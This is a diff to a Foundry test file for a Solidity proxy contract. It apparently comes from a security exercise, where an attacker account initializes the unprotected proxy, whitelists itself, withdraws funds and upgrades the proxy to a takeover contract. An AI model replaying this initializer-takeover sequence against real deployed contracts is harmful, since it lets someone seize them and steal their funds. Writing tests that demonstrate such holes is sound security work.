@@ -19,6 +19,9 @@ contract ProxyTest is Test {
         impl = new Impl();
         vm.prank(user);
         proxy = new DasProxy(address(impl), "");
+        deal(user, 1 ether);
+        deal(address(this), 1 ether);
+        deal(attacker, 1 ether);
     }
 
     function testProxyIsNotInitialized() public {
@@ -33,7 +36,7 @@ contract ProxyTest is Test {
     }
 
     function testTaskFlow() public {
-        (bool validResponse, bytes memory returnedData) = address(proxy).call(
+        (bool validResponse, bytes memory returnedData) = address(proxy).call{value: 0.1 ether}(
             abi.encodeWithSignature("initialize()")
         );
         assertTrue(validResponse);
@@ -46,7 +49,7 @@ contract ProxyTest is Test {
 
         // attacker can call initialize
         vm.prank(attacker);
-        (validResponse, returnedData) = address(proxy).call(
+        (validResponse, returnedData) = address(proxy).call{value: 0.1 ether}(
             abi.encodeWithSignature("initialize()")
         );
         assertTrue(validResponse);
@@ -60,6 +63,34 @@ contract ProxyTest is Test {
         // attacker can call upgrade
         vm.prank(attacker);
         TakeOwnership takeOwnership = new TakeOwnership();
+
+        // cannot update without withdrawing funds
+        vm.prank(attacker);
+        vm.expectRevert(bytes("!withdraw"));
+        (validResponse, returnedData) = address(proxy).call(
+            abi.encodeWithSignature("upgradeTo(address)", address(takeOwnership))
+        );
+
+        // cannot update without whitelisting
+        vm.prank(attacker);
+        vm.expectRevert(bytes("!whitelisted"));
+        (validResponse, returnedData) = address(proxy).call(
+            abi.encodeWithSignature("upgradeTo(address)", address(takeOwnership))
+        );
+
+        // whitelist owner
+        vm.prank(attacker);
+        (validResponse, returnedData) = address(proxy).call(
+            abi.encodeWithSignature("whitelistUser(address)", attacker)
+        );
+        
+        // cannot update without withdrawing funds
+        vm.prank(attacker);
+        (validResponse, returnedData) = address(proxy).call(
+            abi.encodeWithSignature("withdraw(uint256)", 2)
+        );
+
+        // upgrade proxy
         vm.prank(attacker);
         (validResponse, returnedData) = address(proxy).call(
             abi.encodeWithSignature("upgradeTo(address)", address(takeOwnership))
